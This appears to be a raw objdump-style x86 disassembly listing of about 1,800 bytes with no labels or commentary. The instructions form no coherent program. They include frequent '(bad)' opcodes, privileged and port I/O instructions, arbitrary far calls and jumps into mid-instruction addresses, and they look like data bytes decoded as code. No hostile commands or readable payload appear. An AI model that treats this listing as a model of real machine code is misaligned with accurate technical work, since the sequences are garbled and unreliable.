  40be8d:	jg     0x40beb3
  40be8f:	mov    esi,0xa3a66776
  40be94:	sub    DWORD PTR [esi],eax
  40be96:	push   ebp
  40be97:	mov    ds:0x1d88c4a7,al
  40be9c:	push   ecx
  40be9d:	fcomp  DWORD PTR [ecx]
  40be9f:	stos   BYTE PTR es:[edi],al
  40bea0:	push   cs
  40bea1:	nop
  40bea2:	cmp    al,0x42
  40bea4:	ja     0x40be93
  40bea6:	add    BYTE PTR [ecx-0x4],bl
  40bea9:	orps   xmm2,XMMWORD PTR [ebx]
  40beac:	retf   
  40bead:	rol    DWORD PTR [eax+0x41],1
  40beb0:	jae    0x40be6c
  40beb2:	test   al,0xbb
  40beb4:	test   eax,0x3cc18989
  40beb9:	sub    BYTE PTR [edx+eax*1-0x54],bl
  40bebd:	sbb    BYTE PTR ds:0xd8e7d9a5,al
  40bec3:	fucomip st,st(4)
  40bec5:	dec    ebp
  40bec6:	pop    ebx
  40bec7:	sysexit 
  40bec9:	mov    cl,0x30
  40becb:	cld    
  40becc:	aad    0x66
  40bece:	mov    bh,0x1d
  40bed0:	jp     0x40beec
  40bed2:	aad    0x97
  40bed4:	(bad)  
  40bed5:	cmc    
  40bed6:	fs aam 0xf1
  40bed9:	cmp    eax,edi
  40bedb:	adc    ebp,DWORD PTR [eax+eax*4]
  40bede:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bedf:	mov    BYTE PTR [ebx],bh
  40bee1:	dec    ebx
  40bee2:	fs jb  0x40beae
  40bee5:	xor    BYTE PTR [esi+esi*8-0x41],cl
  40bee9:	test   al,0xb2
  40beeb:	mov    ch,0x4e
  40beed:	cmp    BYTE PTR [edi-0x5e],ah
  40bef0:	stos   DWORD PTR es:[edi],eax
  40bef1:	ss ret 0xb8f7
  40bef5:	repnz daa 
  40bef7:	int    0xec
  40bef9:	mov    bh,0x54
  40befb:	inc    ecx
  40befc:	xchg   ebp,eax
  40befd:	add    eax,0xd076b408
  40bf02:	inc    eax
  40bf03:	push   0xffffffac
  40bf05:	mov    esi,0x93e534c0
  40bf0a:	ins    BYTE PTR es:[edi],dx
  40bf0b:	push   0xffffffca
  40bf0d:	jno    0x40becd
  40bf0f:	or     DWORD PTR [ecx-0x77],0x7a43193f
  40bf16:	push   esp
  40bf17:	loop   0x40bf2c
  40bf19:	inc    edx
  40bf1a:	push   eax
  40bf1b:	mov    ebx,0x3facc55a
  40bf20:	cmp    esp,eax
  40bf22:	push   0x3
  40bf24:	inc    esi
  40bf25:	jae    0x40bf7f
  40bf27:	(bad)  
  40bf28:	push   esp
  40bf29:	adc    DWORD PTR [eax-0x75],edi
  40bf2c:	pop    esi
  40bf2d:	mov    bh,BYTE PTR [ebx-0x60151d4c]
  40bf33:	seto   BYTE PTR [ebp+0x494ab6cd]
  40bf3a:	(bad)
  40bf3d:	xor    BYTE PTR [edi+edx*4],0x77
  40bf41:	adc    al,0xe3
  40bf43:	xor    ebx,ebp
  40bf45:	ins    DWORD PTR es:[edi],dx
  40bf46:	jge    0x40bf40
  40bf48:	iret   
  40bf49:	push   ds
  40bf4a:	mov    DWORD PTR [edi+edi*4+0x31],ebp
  40bf4e:	or     BYTE PTR [ebx-0x72b85a11],al
  40bf54:	cs jl  0x40bf05
  40bf57:	push   ds
  40bf58:	push   ebx
  40bf59:	fild   WORD PTR [edx+0x2bb73d6d]
  40bf5f:	shl    ebx,1
  40bf61:	push   esi
  40bf62:	pop    eax
  40bf63:	ror    BYTE PTR [esi+0xb2be9b9],1
  40bf69:	xchg   DWORD PTR [ebx+ebp*8-0x7e],ebp
  40bf6d:	shr    BYTE PTR [eax-0x4a],1
  40bf70:	(bad)  
  40bf71:	add    BYTE PTR [edi],dl
  40bf73:	out    0x3f,eax
  40bf75:	icebp  
  40bf76:	hlt    
  40bf77:	lds    esp,FWORD PTR [eax-0x1]
  40bf7a:	dec    ecx
  40bf7b:	mov    ebx,0xe6c38cf4
  40bf80:	popa   
  40bf81:	pop    ds
  40bf82:	call   0x5247:0xfb9cf4fd
  40bf89:	pop    esp
  40bf8a:	test   eax,0x3e31b845
  40bf8f:	pop    ebp
  40bf90:	ds push ebp
  40bf92:	arpl   WORD PTR ds:0x836436d9,si
  40bf98:	mov    eax,0x39bcbe07
  40bf9d:	inc    esp
  40bf9e:	repnz jecxz 0x40c00d
  40bfa1:	bound  ebp,QWORD PTR [ecx]
  40bfa3:	test   BYTE PTR [ecx+0x6d],ah
  40bfa6:	imul   ebp,ebp,0x12
  40bfa9:	add    bh,BYTE PTR [edi-0x13]
  40bfac:	and    DWORD PTR [edx-0x6c],0x15ef75ef
  40bfb3:	div    DWORD PTR [ecx+0x45]
  40bfb6:	dec    si
  40bfb8:	in     al,0xec
  40bfba:	out    0x92,al
  40bfbc:	fbld   TBYTE PTR [ecx+0x26]
  40bfbf:	jbe    0x40bf8a
  40bfc1:	shl    DWORD PTR [ebp-0x53ca9703],0x35
  40bfc8:	xor    al,0x43
  40bfca:	sbb    al,dh
  40bfcc:	add    DWORD PTR [ecx],esi
  40bfce:	jg     0x40c024
  40bfd0:	pop    ss
  40bfd1:	in     eax,dx
  40bfd2:	aas    
  40bfd3:	lods   eax,DWORD PTR ds:[esi]
  40bfd4:	(bad)  
  40bfd6:	popf   
  40bfd7:	not    al
  40bfd9:	retf   
  40bfda:	inc    edi
  40bfdb:	sahf   
  40bfdc:	iret   
  40bfdd:	aad    0xbc
  40bfdf:	cmp    dl,0xb5
  40bfe2:	dec    ebx
  40bfe3:	stos   BYTE PTR es:[edi],al
  40bfe4:	in     al,dx
  40bfe5:	ja     0x40c035
  40bfe7:	cwde   
  40bfe8:	arpl   WORD PTR [eax+edi*1],dx
  40bfeb:	xchg   edi,eax
  40bfec:	sbb    bl,bh
  40bfee:	inc    esi
  40bfef:	add    edx,DWORD PTR [ecx-0x27]
  40bff2:	or     ch,BYTE PTR [eax-0x42beddd]
  40bff8:	inc    ecx
  40bff9:	jecxz  0x40c047
  40bffb:	aam    0xbd
  40bffd:	aaa    
  40bffe:	(bad)  
  40c000:	or     eax,0xbdb777b7
  40c005:	(bad)  
  40c006:	mov    ebp,ebx
  40c008:	xor    bh,BYTE PTR [ebx-0x7d4bc7c9]
  40c00e:	push   ebp
  40c00f:	jp     0x40c04e
  40c011:	out    dx,eax
  40c012:	rol    DWORD PTR [ebp-0x4e5c99e3],cl
  40c018:	xor    al,0x78
  40c01a:	mov    fs,esi
  40c01c:	pop    es
  40c01d:	test   BYTE PTR [ebp+0x6e2ea602],cl
  40c023:	cmp    al,BYTE PTR [ecx]
  40c025:	cld    
  40c026:	outs   dx,DWORD PTR ds:[esi]
  40c027:	inc    edi
  40c028:	jae    0x40bfac
  40c02a:	add    BYTE PTR [ecx+0x781433e9],ch
  40c030:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c031:	sub    dl,BYTE PTR [ebp-0x49f7b002]
  40c037:	xor    eax,0xf2ef2455
  40c03c:	mov    bh,0xdd
  40c03e:	and    eax,0xb9ed3da1
  40c043:	lock into 
  40c045:	js     0x40c05d
  40c047:	mov    ds:0xc849d514,al
  40c04c:	add    al,cl
  40c04e:	scas   al,BYTE PTR es:[edi]
  40c04f:	mov    ebp,0x15cf5de2
  40c054:	mov    ebp,0x697ecbbc
  40c059:	(bad)  [edi-0x6e864fdc]
  40c05f:	aad    0xec
  40c061:	xor    BYTE PTR [ebx+0x38f9ea28],ah
  40c067:	int3   
  40c068:	mov    eax,ds:0x6849ff51
  40c06d:	dec    bh
  40c06f:	rcr    BYTE PTR [edi+0x15],cl
  40c072:	adc    DWORD PTR [ebx],esp
  40c074:	push   es
  40c075:	cmp    DWORD PTR [ebx-0x2],ebx
  40c078:	clc    
  40c079:	mov    ds:0x25f014ea,eax
  40c07e:	sbb    edx,DWORD PTR [ecx]
  40c080:	mov    ds:0x78efba68,eax
  40c085:	or     BYTE PTR [edi],dl
  40c087:	dec    ebx
  40c088:	and    si,di
  40c08b:	cwde   
  40c08c:	and    al,0xc8
  40c08e:	test   BYTE PTR [edi-0x17],ch
  40c091:	xor    DWORD PTR [ecx],ebx
  40c093:	aam    0xbc
  40c095:	add    bh,BYTE PTR [esi]
  40c097:	cdq    
  40c098:	(bad)  
  40c099:	stos   DWORD PTR es:[edi],eax
  40c09a:	pop    esp
  40c09b:	jmp    0x67da:0xd8a7e1ee
  40c0a2:	xchg   esp,eax
  40c0a3:	call   0x9eff20f3
  40c0a8:	push   es
  40c0a9:	arpl   WORD PTR [edi-0x30],sp
  40c0ac:	mov    cs,WORD PTR [ebx+eiz*2+0x47]
  40c0b0:	cdq    
  40c0b1:	pop    ecx
  40c0b2:	xor    ebx,DWORD PTR [edx]
  40c0b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0b5:	adc    DWORD PTR [esi-0xa],0xffffffaa
  40c0b9:	xor    ecx,edi
  40c0bb:	adc    bl,BYTE PTR gs:[eax-0x28018b40]
  40c0c2:	xlat   BYTE PTR ds:[ebx]
  40c0c3:	test   al,0x64
  40c0c6:	aaa    
  40c0c7:	push   ss
  40c0c8:	loopne 0x40c10d
  40c0ca:	pop    ebx
  40c0cb:	cmp    eax,eax
  40c0cd:	(bad)  
  40c0ce:	mov    ecx,0x981aac74
  40c0d3:	jae    0x40c077
  40c0d5:	lahf   
  40c0d6:	enter  0x18c8,0xbe
  40c0da:	dec    ebp
  40c0db:	mov    ecx,0xb0ed6137
  40c0e0:	mov    ebx,0x5aa05f75
  40c0e5:	into   
  40c0e6:	sub    eax,0xf76c901
  40c0eb:	test   al,0x31
  40c0ed:	cmp    al,BYTE PTR [ecx-0x7558d205]
  40c0f3:	aad    0x1b
  40c0f5:	or     ah,BYTE PTR ds:0xfad1d244
  40c0fb:	lahf   
  40c0fc:	inc    ebx
  40c0fd:	shr    bl,1
  40c0ff:	(bad)  
  40c100:	mov    edx,0xb09ea134
  40c105:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40c107:	fs sbb al,0xe4
  40c10a:	push   ss
  40c10b:	cwde   
  40c10c:	enter  0x470f,0x46
  40c110:	xchg   ebx,eax
  40c111:	or     bh,ah
  40c113:	push   ebp
  40c114:	jle    0x40c16e
  40c116:	in     al,0x35
  40c118:	mov    ah,0x12
  40c11a:	pop    ss
  40c11b:	mov    esp,0xcf939bf6
  40c120:	xchg   ebp,eax
  40c121:	in     al,dx
  40c122:	mov    ?,WORD PTR [edi-0x78]
  40c125:	jmp    0x40c195
  40c127:	lahf   
  40c128:	add    al,0x7c
  40c12a:	sub    DWORD PTR [ebp-0x68],ebx
  40c12d:	gs inc esi
  40c12f:	xchg   edx,eax
  40c130:	inc    esp
  40c131:	dec    ebp
  40c132:	dec    edi
  40c133:	idiv   BYTE PTR [eax+0x3f]
  40c136:	scas   al,BYTE PTR es:[edi]
  40c137:	cmp    bh,al
  40c139:	daa    
  40c13a:	inc    edx
  40c13b:	mov    eax,ds:0x1442d103
  40c140:	push   edx
  40c141:	ret    0xfc73
  40c144:	aaa    
  40c145:	(bad)  
  40c146:	pop    edx
  40c147:	jo     0x40c136
  40c149:	rcr    DWORD PTR [eax+0x4a],cl
  40c14c:	mov    bl,0xbe
  40c14e:	xchg   ecx,eax
  40c14f:	data16 in al,0xd2
  40c152:	mov    edx,0xb2ff8d8e
  40c157:	js     0x40c0e3
  40c159:	das    
  40c15a:	sti    
  40c15b:	or     BYTE PTR [edi+eiz*1],bh
  40c15e:	jmp    0x3dd7467f
  40c163:	out    dx,al
  40c164:	mov    esp,0xe4047304
  40c169:	pusha  
  40c16a:	stc    
  40c16b:	pop    ss
  40c16c:	cdq    
  40c16d:	xchg   edi,eax
  40c16e:	arpl   WORD PTR [edx],cx
  40c170:	cmp    edx,DWORD PTR [eax]
  40c172:	jmp    0x40c135
  40c174:	ds jae 0x40c1c3
  40c177:	mov    DWORD PTR ds:0x70e7cecf,ecx
  40c17d:	jno    0x40c1ec
  40c17f:	mov    al,BYTE PTR [edx]
  40c181:	(bad)  
  40c182:	pop    ss
  40c183:	push   edi
  40c184:	sub    ecx,DWORD PTR [edi-0x3365385c]
  40c18a:	lods   al,BYTE PTR ds:[esi]
  40c18b:	push   ss
  40c18c:	pop    ss
  40c18d:	fwait
  40c18e:	adc    ebx,DWORD PTR [edi-0x40]
  40c191:	sub    eax,0x6ef7f1c8
  40c196:	mov    dl,0xc
  40c198:	sbb    al,0x87
  40c19a:	mov    ds:0x684a13dd,eax
  40c19f:	in     eax,dx
  40c1a0:	data16 cmc 
  40c1a2:	push   esi
  40c1a3:	lea    edi,[esi+ebx*2-0x75]
  40c1a7:	repz sar DWORD PTR [edi-0x37536a02],1
  40c1ae:	mov    bl,0xc5
  40c1b0:	mov    dl,0xf
  40c1b2:	add    ebp,DWORD PTR [ebx]
  40c1b4:	sbb    eax,0x93ebe721
  40c1b9:	aaa    
  40c1ba:	loop   0x40c1bb
  40c1bc:	inc    edi
  40c1bd:	or     al,0x27
  40c1bf:	out    dx,al
  40c1c0:	cmc    
  40c1c1:	inc    edi
  40c1c2:	mov    eax,ds:0xd9f00a65
  40c1c7:	sub    BYTE PTR [esi],0x3b
  40c1ca:	mov    ds:0x4bffa10d,al
  40c1cf:	dec    edi
  40c1d0:	jnp    0x40c1c8
  40c1d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1d3:	ror    DWORD PTR [edx-0x25],1
  40c1d6:	aaa    
  40c1d7:	sub    DWORD PTR [esi],0x3dbdafc5
  40c1dd:	or     eax,0x93a00072
  40c1e2:	ret    0x7b23
  40c1e5:	cld    
  40c1e6:	shr    BYTE PTR [eax-0x61b1661],0xa6
  40c1ed:	fimul  DWORD PTR [ebx+0x590be8d4]
  40c1f3:	xor    DWORD PTR [eax+eiz*2-0x581dfd1b],0xb3991311
  40c1fe:	mov    dl,0x2d
  40c200:	xor    ebp,edi
  40c202:	stc    
  40c203:	mov    BYTE PTR [ebx],dh
  40c205:	aaa    
  40c206:	push   0xdb3daf31
  40c20b:	dec    esp
  40c20c:	test   BYTE PTR [edi+0x65],ch
  40c20f:	mov    cl,0x64
  40c211:	scas   al,BYTE PTR es:[edi]
  40c212:	in     eax,0xea
  40c214:	inc    ebp
  40c215:	mul    ch
  40c217:	sub    al,0x12
  40c219:	ds jo  0x40c239
  40c21c:	inc    ebp
  40c21d:	push   ds
  40c21e:	xor    eax,0x52b17973
  40c223:	dec    esi
  40c224:	fcmovnbe st,st(4)
  40c226:	pop    ecx
  40c227:	dec    esi
  40c228:	cmp    DWORD PTR [ecx],eax
  40c22a:	mov    dh,0x71
  40c22c:	xchg   edx,eax
  40c22d:	sub    cl,ah
  40c22f:	mov    ebp,0x3cb9d51
  40c234:	(bad)  [esi+0x6653f3fc]
  40c23a:	outs   dx,BYTE PTR ds:[esi]
  40c23b:	js     0x40c24e
  40c23d:	sbb    edx,esp
  40c23f:	shr    BYTE PTR [ebp+edx*2-0xa],0x6
  40c244:	and    eax,0x3230295c
  40c249:	xor    al,0x30
  40c24b:	or     BYTE PTR [eax+edi*4+0x8],ch
  40c24f:	outs   dx,DWORD PTR ds:[esi]
  40c250:	push   ds
  40c251:	lods   eax,DWORD PTR ds:[esi]
  40c252:	rcl    BYTE PTR [esi],1
  40c254:	dec    ebp
  40c255:	xlat   BYTE PTR ds:[ebx]
  40c256:	mov    dh,0x9a
  40c258:	push   es
  40c259:	push   cs
  40c25a:	jp     0x40c212
  40c25c:	mov    esp,0x2cc257e9
  40c261:	repz xchg ebp,eax
  40c263:	mov    ds:0x77de7c21,al
  40c268:	inc    ebx
  40c269:	add    al,0x27
  40c26b:	stos   BYTE PTR es:[edi],al
  40c26c:	arpl   WORD PTR [edx-0x20],bp
  40c26f:	add    BYTE PTR [edx-0x3761acd4],ch
  40c275:	jl     0x40c2c1
  40c277:	xor    ebx,DWORD PTR ds:0x207ddefe
  40c27d:	mov    ebx,0x54e0a2d1
  40c282:	dec    esp
  40c283:	jge    0x40c239
  40c285:	stos   BYTE PTR es:[edi],al
  40c286:	pop    ebp
  40c287:	mov    bl,0x84
  40c289:	push   es
  40c28a:	mov    ebp,0x7643ab6f
  40c28f:	outs   dx,DWORD PTR ds:[esi]
  40c290:	pop    ss
  40c291:	adc    al,BYTE PTR ds:0xadeb84b7
  40c297:	push   esi
  40c298:	leave  
  40c299:	jo     0x40c2d9
  40c29b:	in     al,dx
  40c29c:	or     BYTE PTR [edx+0x65],al
  40c29f:	mov    al,ds:0x37f0aa71
  40c2a4:	xchg   DWORD PTR [ebx],eax
  40c2a6:	add    edx,edi
  40c2a8:	mov    al,ds:0xbb24604
  40c2ad:	lahf   
  40c2ae:	push   eax
  40c2af:	mov    bh,0x3d
  40c2b1:	fisttp WORD PTR [eax+0x13]
  40c2b4:	loopne 0x40c28c
  40c2b6:	cmp    edx,0x1d
  40c2b9:	dec    eax
  40c2ba:	mov    esi,eax
  40c2bc:	test   DWORD PTR ds:0x61b0383,esi
  40c2c2:	test   BYTE PTR [ebp+0x23e37e45],bl
  40c2c8:	lock fwait
  40c2ca:	sbb    esp,DWORD PTR [esi]
  40c2cc:	push   ebx
  40c2cd:	jge    0x40c2a0
  40c2cf:	call   0x1991:0x548470e7
  40c2d6:	pop    ds
  40c2d7:	mov    cl,0xe6
  40c2d9:	xchg   ebx,eax
  40c2da:	mov    esp,0xed5daffa
  40c2df:	dec    DWORD PTR [ecx-0x18]
  40c2e2:	out    dx,al
  40c2e3:	push   edi
  40c2e4:	push   ss
  40c2e5:	in     eax,dx
  40c2e6:	inc    edx
  40c2e7:	sub    eax,0xdbf32f0c
  40c2ec:	pop    esp
  40c2ed:	mov    bl,0xd2
  40c2ef:	mov    ebx,0xac658ba
  40c2f4:	xlat   BYTE PTR ds:[ebx]
  40c2f5:	cvtpi2ps xmm2,QWORD PTR ds:0xbf0a9011
  40c2fc:	mov    bl,0xe8
  40c2fe:	pop    ss
  40c2ff:	inc    esp
  40c300:	lahf   
  40c301:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c302:	pop    DWORD PTR [eax-0x24]
  40c305:	inc    edx
  40c306:	iret   
  40c307:	popf   
  40c308:	mov    BYTE PTR [ebp-0x6f],bl
  40c30b:	popf   
  40c30c:	leave  
  40c30d:	sti    
  40c30e:	cmp    al,0x75
  40c310:	out    0x2d,eax
  40c312:	enter  0x37e0,0x38
  40c316:	add    ah,BYTE PTR [ebp+0x73cfce1e]
  40c31c:	loopne 0x40c396
  40c31e:	outs   dx,DWORD PTR ds:[esi]
  40c31f:	jmp    0x40c34f
  40c321:	dec    edi
  40c322:	sub    eax,0xacf7bd94
  40c327:	out    dx,eax
  40c328:	lods   al,BYTE PTR ds:[esi]
  40c329:	xor    edx,ecx
  40c32b:	sahf   
  40c32c:	pop    eax
  40c32d:	daa    
  40c32e:	push   edi
  40c32f:	and    BYTE PTR [eax*1+0x19a35308],ah
  40c336:	cmp    al,0x8b
  40c338:	and    al,0x7c
  40c33a:	aam    0x80
  40c33c:	test   DWORD PTR [esi+0x43205e6e],ebx
  40c342:	sahf   
  40c343:	inc    ecx
  40c344:	jecxz  0x40c311
  40c346:	aam    0x1a
  40c348:	sub    esp,edi
  40c34a:	jp     0x40c2d1
  40c34c:	pushf  
  40c34d:	rcr    DWORD PTR [ebx],cl
  40c34f:	int    0x19
  40c351:	aas    
  40c352:	dec    esp
  40c353:	xchg   ebx,eax
  40c354:	jbe    0x40c322
  40c356:	push   edi
  40c357:	jle    0x40c317
  40c359:	fnsave [edx+eax*1]
  40c35c:	mov    ah,0xcb
  40c35e:	pop    ecx
  40c35f:	xor    ebx,edi
  40c361:	and    esp,DWORD PTR [ebx]
  40c363:	mov    ch,0xe
  40c365:	xchg   bh,ah
  40c367:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c368:	mov    al,ds:0xe8d239ae
  40c36d:	inc    esi
  40c36e:	adc    ch,ch
  40c370:	jne    0x40c38d
  40c372:	ret    
  40c373:	in     eax,0x12
  40c375:	dec    edi
  40c376:	push   edx
  40c377:	ja     0x40c304
  40c379:	push   ss
  40c37a:	mov    ds:0xec8a8613,al
  40c37f:	mov    ds:0xd3559f09,eax
  40c384:	mov    bl,0xce
  40c386:	push   ecx
  40c387:	push   esi
  40c388:	mov    BYTE PTR [eax],dl
  40c38a:	(bad)  
  40c38b:	ds es pop esi
  40c38e:	sti    
  40c38f:	out    0x7f,eax
  40c391:	mov    ecx,0xfb44615b
  40c396:	xlat   BYTE PTR ds:[ebx]
  40c397:	mov    ds:0x260763a1,eax
  40c39c:	mov    dh,0x45
  40c39e:	arpl   WORD PTR [edx-0x32],bx
  40c3a1:	xchg   esi,eax
  40c3a2:	inc    eax
  40c3a3:	or     al,0x10
  40c3a5:	mov    ?,WORD PTR [ecx]
  40c3a7:	xor    DWORD PTR [edi],0xffffffcc
  40c3aa:	lahf   
  40c3ab:	sti    
  40c3ac:	js     0x40c35f
  40c3ae:	or     al,0x53
  40c3b0:	enter  0x9fe5,0x45
  40c3b4:	das    
  40c3b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3b6:	out    0xa2,eax
  40c3b8:	jmp    0xd57fd474
  40c3bd:	sbb    BYTE PTR [ecx+0x26990f13],dl
  40c3c3:	nop
  40c3c4:	xchg   esi,eax
  40c3c5:	jecxz  0x40c368
  40c3c7:	std    
  40c3c8:	in     al,dx
  40c3c9:	fisubr DWORD PTR [ebx+esi*4-0x9]
  40c3cd:	xor    DWORD PTR [eax+0x30a32bb8],edi
  40c3d3:	adc    BYTE PTR [edx],dl
  40c3d5:	jbe    0x40c36e
  40c3d7:	gs sub ch,ah
  40c3da:	iret   
  40c3db:	jnp    0x40c3a9
  40c3dd:	and    DWORD PTR [esi],0x43
  40c3e0:	mov    BYTE PTR [ebx-0x33],dl
  40c3e3:	mov    cl,0x20
  40c3e5:	shr    DWORD PTR [edi+0x3e7885ca],cl
  40c3eb:	jge    0x40c3bd
  40c3ed:	(bad)  [esi-0x35]
  40c3f0:	test   DWORD PTR [ebx],edx
  40c3f2:	(bad)  
  40c3f3:	xchg   ebp,eax
  40c3f4:	sbb    ch,BYTE PTR [edx+0x4a]
  40c3f7:	js     0x40c42d
  40c3f9:	jne    0x40c45c
  40c3fb:	xchg   ecx,eax
  40c3fc:	stos   BYTE PTR es:[edi],al
  40c3fd:	mov    ds:0x1b359eb,al
  40c402:	mov    cs,WORD PTR [ecx]
  40c404:	xor    BYTE PTR [esi],dl
  40c406:	xor    al,0x9
  40c408:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c409:	popa   
  40c40a:	das    
  40c40b:	jbe    0x40c488
  40c40d:	dec    edi
  40c40e:	mov    DWORD PTR [esi-0x27d296ea],edx
  40c414:	scas   al,BYTE PTR es:[edi]
  40c415:	in     al,dx
  40c416:	xchg   ecx,eax
  40c417:	retf   
  40c418:	pop    edi
  40c419:	lock xchg eax,edi
  40c41c:	add    al,0x10
  40c41e:	fsincos 
  40c420:	popf   
  40c421:	fadd   st(4),st
  40c423:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c424:	push   es
  40c425:	add    al,0xf3
  40c427:	hlt    
  40c428:	aad    0x5c
  40c42a:	mov    fs,WORD PTR [edi]
  40c42c:	pop    esi
  40c42d:	inc    esp
  40c42e:	(bad)  
  40c42f:	(bad)  
  40c430:	in     al,dx
  40c431:	jnp    0x40c44a
  40c433:	cli    
  40c434:	lds    esi,FWORD PTR [ebx-0x39d34c08]
  40c43a:	mov    bl,0x14
  40c43c:	inc    eax
  40c43d:	sbb    al,0xe3
  40c43f:	hlt    
  40c440:	sub    esp,DWORD PTR [eax]
  40c442:	dec    eax
  40c443:	enter  0x306f,0x8a
  40c447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c448:	cmp    bl,bh
  40c44a:	dec    edx
  40c44b:	add    eax,0x27cc881a
  40c450:	sbb    BYTE PTR [edi+ebp*4+0x36b89462],0x6a
  40c458:	int3   
  40c459:	jno    0x40c44e
  40c45b:	adc    edx,ebp
  40c45d:	inc    edi
  40c45e:	fisttp WORD PTR [edi-0x56d884fd]
  40c464:	and    esi,DWORD PTR [bp+si-0x10e2]
  40c469:	sbb    BYTE PTR [ebp-0x21],dl
  40c46c:	cmp    edx,eax
  40c46e:	jno    0x40c4e1
  40c470:	cmp    eax,0x2f039950
  40c475:	sbb    BYTE PTR [eax],ch
  40c477:	stc    
  40c478:	pop    ss
  40c479:	jecxz  0x40c479
  40c47b:	leave  
  40c47c:	mov    cs,WORD PTR [ebx-0x7724bc48]
  40c482:	addr16 (bad) 
  40c485:	nop
  40c486:	mov    al,0x3c
  40c488:	fwait
  40c489:	shl    al,cl
  40c48b:	outs   dx,DWORD PTR ds:[esi]
  40c48c:	or     eax,0x60ff9db4
  40c491:	jae    0x40c46a
  40c493:	loopne 0x40c4d9
  40c495:	adc    al,BYTE PTR [ebx]
  40c497:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40c499:	inc    esp
  40c49a:	lock (bad) 
  40c49d:	lock mov WORD PTR [edi+eiz*4-0x4e71cf70],fs
  40c4a5:	xchg   BYTE PTR [ebp-0x15ba659c],bl
  40c4ab:	sahf   
  40c4ac:	inc    esi
  40c4ad:	xchg   ebp,eax
  40c4ae:	or     al,0x90
  40c4b0:	push   0xffffff8f
  40c4b2:	scas   al,BYTE PTR es:[edi]
  40c4b3:	xor    DWORD PTR [eax],eax
  40c4b5:	imul   edx,DWORD PTR [ebx-0x186c5797],0x55cf48f3
  40c4bf:	or     eax,0x61c26a57
  40c4c4:	inc    esp
  40c4c5:	pop    edx
  40c4c6:	leave  
  40c4c7:	xchg   ecx,eax
  40c4c8:	lds    esp,FWORD PTR [ebx-0x1d19fafa]
  40c4ce:	aam    0xb5
  40c4d0:	pop    edi
  40c4d1:	mov    ?,WORD PTR [ebp-0x14a3d8f4]
  40c4d7:	fstp   TBYTE PTR [ebx+edx*1]
  40c4da:	push   0xffffff9b
  40c4dc:	add    DWORD PTR [edi+0x42],0x81ef9978
  40c4e3:	jmp    0x6af57d95
  40c4e8:	lods   eax,DWORD PTR ds:[esi]
  40c4e9:	push   ds
  40c4ea:	pop    esi
  40c4eb:	mov    al,es:0xf91eed30
  40c4f1:	and    DWORD PTR [edx+0x3f],ecx
  40c4f4:	aaa    
  40c4f5:	jo     0x40c48e
  40c4f7:	mov    ebp,0xfc89c465
  40c4fc:	xor    eax,0xc05f8064
  40c501:	mov    dh,0x52
  40c503:	mov    BYTE PTR [ecx-0xbc7a48e],dh
  40c509:	push   edi
  40c50a:	inc    edi
  40c50b:	and    ch,BYTE PTR [edx]
  40c50d:	aam    0x61
  40c50f:	jle    0x40c522
  40c511:	push   esp
  40c512:	push   0x6fba0cbd
  40c517:	mov    al,0x19
  40c519:	or     esp,edx
  40c51b:	adc    eax,0xa2c71281
  40c520:	push   esi
  40c521:	out    0xbe,eax
  40c523:	call   0x55aaac86
  40c528:	test   edx,ecx
  40c52a:	mov    ds,WORD PTR [eax]
  40c52c:	daa    
  40c52d:	sbb    al,0x55
  40c52f:	mov    DWORD PTR [eax],edx
  40c531:	call   0x87ff:0x84fdc891
  40c538:	inc    ebx
  40c539:	mov    bh,BYTE PTR [edx+edx*2+0x4b136815]
  40c540:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c541:	or     BYTE PTR [edx-0x5b886acc],ah
  40c547:	stc    
  40c548:	in     al,0x5b
  40c54a:	sar    DWORD PTR [ebx+0x40],1
  40c54d:	adc    bh,al
  40c54f:	sub    al,0x47
  40c551:	ins    BYTE PTR es:[edi],dx
  40c552:	cmp    DWORD PTR [ecx+0x60],esi
  40c555:	rol    ebx,0xa1
  40c558:	mov    dl,0x2
  40c55a:	inc    ebx
  40c55b:	mov    esp,0x969fce8b
  40c560:	dec    esp
  40c561:	mov    ecx,0x86d62058
  40c566:	adc    DWORD PTR [esi+0x3faf3505],0x68
  40c56d:	mov    al,al
  40c56f:	push   ecx
  40c570:	jecxz  0x40c5a7
  40c572:	cmp    BYTE PTR [ecx-0x35ba21c7],bl
  40c578:	call   0x9b58b7a
  40c57d:	xlat   BYTE PTR ds:[ebx]
  40c57e:	cmp    DWORD PTR [eax-0x5d],0x906e7f33
  40c585:	pusha  
  40c586:	loope  0x40c5f2
  40c588:	jmp    0x910b:0x35e98329
  40c58f:	pop    ecx
  40c590:	retf   0xe21f
  40c593:	std    
  40c594:	mov    ch,0x94
  40c596:	aad    0x92
  40c598:	outs   dx,BYTE PTR ds:[esi]
  40c599:	push   cs
  40c59a:	inc    ecx
  40c59b:	mov    al,0x9c
  40c59d:	cdq    
  40c59e:	popf   
  40c59f:	hlt    
  40c5a0:	cli    
  40c5a1:	inc    esp
  40c5a2:	out    dx,al
  40c5a3:	sub    BYTE PTR [edx+edi*8+0x556c34fc],al
  40c5aa:	push   ds
  40c5ab:	xchg   DWORD PTR [ebp-0x40],edx
  40c5ae:	push   cs
  40c5af:	retf   0x20b
  40c5b2:	adc    eax,ebx
  40c5b4:	std    
  40c5b5:	xlat   BYTE PTR ds:[ebx]
  40c5b6:	jg     0x40c5cf
  40c5b8:	push   es
  40c5b9:	xchg   ebp,eax
  40c5ba:	cwde   
  40c5bb:	adc    cl,BYTE PTR [esi+0x3821e351]
  40c5c1:	leave  
  40c5c2:	inc    ebp
  40c5c3:	xor    al,BYTE PTR [ebp+eiz*2-0x21]
  40c5c7:	jno    0x40c644
  40c5c9:	mov    ecx,0x2a526adf
  40c5ce:	clc    
  40c5cf:	stc    
  40c5d0:	mov    esp,0x58fd3ee5
  40c5d5:	lods   al,BYTE PTR ds:[esi]
  40c5d6:	js     0x40c63b
